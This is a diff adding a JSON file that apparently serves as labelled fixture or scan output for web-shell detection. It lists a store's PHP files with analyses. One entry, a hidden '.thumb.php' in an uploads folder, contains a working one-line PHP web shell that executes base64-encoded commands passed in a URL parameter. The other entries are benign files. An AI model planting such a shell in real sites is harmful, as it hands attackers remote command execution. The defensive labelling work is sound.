@@ -1,0 +1,25 @@
+{
+  "/var/www/html/uploads/images/.thumb.php": {
+    "content": "<?php if(isset($_GET['cmd'])){echo shell_exec(base64_decode($_GET['cmd']));}?>",
+    "analysis": {
+      "type": "Simple PHP Web Shell",
+      "capabilities": ["command_execution"],
+      "encoding": "base64",
+      "parameter": "cmd"
+    }
+  },
+  "/var/www/html/index.php": {
+    "content": "<?php\nrequire_once 'includes/config.php';\nrequire_once 'includes/db.php';\n\n$page_title = 'Welcome to Our Store';\ninclude 'templates/header.php';\n?>\n<div class=\"hero\">\n  <h1>Welcome to Our Online Store</h1>\n  <p>Find the best products at great prices</p>\n</div>\n<?php include 'templates/featured.php'; ?>\n<?php include 'templates/footer.php'; ?>",
+    "analysis": {
+      "type": "Legitimate PHP page",
+      "suspicious": false
+    }
+  },
+  "/var/www/html/includes/config.php": {
+    "content": "<?php\ndefine('DB_HOST', 'localhost');\ndefine('DB_NAME', 'store_db');\ndefine('DB_USER', 'store_user');\ndefine('DB_PASS', 'REDACTED');\ndefine('SITE_URL', 'https://store.example.com');\ndefine('DEBUG', false);\n?>",
+    "analysis": {
+      "type": "Configuration file",
+      "suspicious": false
+    }
+  }
+}
